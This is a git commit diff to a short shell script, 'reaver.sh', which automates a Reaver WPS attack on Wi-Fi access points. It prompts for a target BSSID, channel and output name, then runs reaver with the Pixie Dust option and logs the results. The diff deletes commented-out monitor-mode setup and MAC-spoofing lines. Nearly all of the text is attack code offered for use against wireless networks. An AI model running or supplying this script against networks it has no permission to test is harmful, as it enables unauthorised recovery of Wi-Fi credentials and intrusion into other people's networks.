e2949e28a20f039f3d1ac1f33224172ecde59976
xiXRedNomadXix <124952504+xiXRedNomadXix@users.noreply.github.com>
2023-02-12 22:35:18 +0000

    Update reaver.sh

--- reaver.sh
+++ reaver.sh
@@ -2,7 +2,6 @@
 
 ##################################### Reaver attack automation ##################################
 
-#read -ep "Wlan1 MAC: " MAC
 
 read -ep "Target BSSID: " TGT
 
@@ -10,14 +9,4 @@ read -ep "Target Channel: " CHAN
 
 read -ep "Output File Name: " TXT
 
-#sudo airmon-ng check kill
-#sleep .1
-#sudo airmon-ng start wlan1
-#sleep .1
-#sudo ifconfig wlan1mon down 
-#sleep .1
-#sudo macchanger -m $MAC wlan1mon
-#sleep .1
-#sudo ifconfig wlan1mon up
-#sleep .1
 sudo reaver -i wlan1mon -b $TGT -c $CHAN -K -S -vvv | tee /home/user/Desktop/Collection/ReaverDump/$TXT.txt
